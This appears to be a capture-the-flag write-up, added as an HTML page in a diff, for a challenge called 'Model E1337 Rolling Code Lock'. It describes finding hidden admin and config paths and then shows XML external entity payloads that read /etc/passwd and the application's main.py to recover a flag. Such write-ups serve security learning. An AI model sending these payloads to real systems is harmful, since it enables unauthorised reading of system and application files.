@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Model E1337 Rolling Code Lock</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Model E1337 Rolling Code Lock</h1>
+</header>
+<p>Try out several subpath found the following is valid</p>
+<ul>
+<li>[1] http://34.74.105.127/a89232cf07/unlock</li>
+<li>[2] http://34.74.105.127/a89232cf07/admin</li>
+</ul>
+<p><code>[2]</code> leads to admin panel</p>
+<p>There is a comment in admin page indicates a path named ‘get-config’ By checking</p>
+<pre><code>  http://34.74.105.127/a89232cf07/get-config</code></pre>
+<p>We found it leads to a page shows ‘Front door’ same string at admin panel</p>
+<p>View the source code of get-config, turns out it’s actually an XML file. looks like there are some logic to read the xml file and generate the admin page.</p>
+<p>Test url</p>
+<pre><code>  http://34.74.105.127/a89232cf07/set-config</code></pre>
+<p>Got a <code>Bad Request</code> message which means this is a valid path.</p>
+<p>Try to request with parameter ‘data’ and payload</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mycode [&lt;!ELEMENT config ANY &gt;&lt;!ENTITY mycode SYSTEM &quot;/etc/passwd&quot; &gt;]&gt;&lt;config&gt;&lt;location&gt;&amp;mycode;&lt;/location&gt;&lt;/config&gt;</code></pre>
+<p>It redirect to admin page with content of /etc/passwd.</p>
+<p>Try out several paths, seems <code>main.py</code> is a valid one.</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mycode [&lt;!ELEMENT config ANY &gt;&lt;!ENTITY mycode SYSTEM &quot;main.py&quot; &gt;]&gt;&lt;config&gt;&lt;location&gt;&amp;mycode;&lt;/location&gt;&lt;/config&gt;</code></pre>
+<p>Found one flag in file main.py.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
